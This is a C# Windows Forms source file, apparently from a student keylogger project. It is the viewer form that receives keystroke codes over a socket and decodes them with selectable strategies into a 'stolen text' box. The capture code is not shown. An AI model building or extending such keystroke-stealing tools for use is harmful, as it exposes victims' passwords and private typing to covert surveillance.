using IP;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Interfata_Urata
{
    public partial class InterfataSimpla : Form
    {
        private LoggerWriter _log;
        public InterfataSimpla(LoggerWriter log)
        {
            InitializeComponent();
            _log = log;
            ModAfisare.DropDownStyle = ComboBoxStyle.DropDownList;
            TextFurat.ReadOnly = true;
        }

        private void label1_Click(object sender, EventArgs e)
        {

        }

        private void button2_Click(object sender, EventArgs e)
        {
            this.Close();
        }

        private void comboBox1_SelectedIndexChanged(object sender, EventArgs e)
        {
            switch(ModAfisare.SelectedIndex)
            {
                case 0:
                    {
                        _log.SetStrategy(new VKCodeStrategy());
                        break;
                    }
                case 1:
                    {
                        _log.SetStrategy(new ToStringStrategy());
                        break;
                    }
                case 2:
                    {
                        _log.SetStrategy(new ToCharStrategy());
                        break;
                    }
                case 3:
                    {
                        _log.SetStrategy(new SmartStrategy());
                        break;
                    }
            }
        }

        private void label3_Click(object sender, EventArgs e)
        {

        }

        private void timer1_Tick(object sender, EventArgs e)
        {
            string TastePrimite = SocketReceiver.CitesteDate();
            SocketDebug.Text = SocketReceiver.ExceptieSochet;
            if (TastePrimite != "")
            {
                String[] vkCodeStr = TastePrimite.Split(' ');
                foreach (String code in vkCodeStr)
                {
                    if (code != "")
                    {
                        int vkCode = Int16.Parse(code);
                        _log.HandleVK(vkCode, "", this);
                    }
                }
            }
            
        }

        private void Form1_Load(object sender, EventArgs e)
        {

        }

        private void textBox1_TextChanged(object sender, EventArgs e)
        {

        }

        private void Exit_Click(object sender, EventArgs e)
        {

            Help.ShowHelp(this, "Interfata Urata\\res\\Key Logger.chm");
            

        }
    }
}
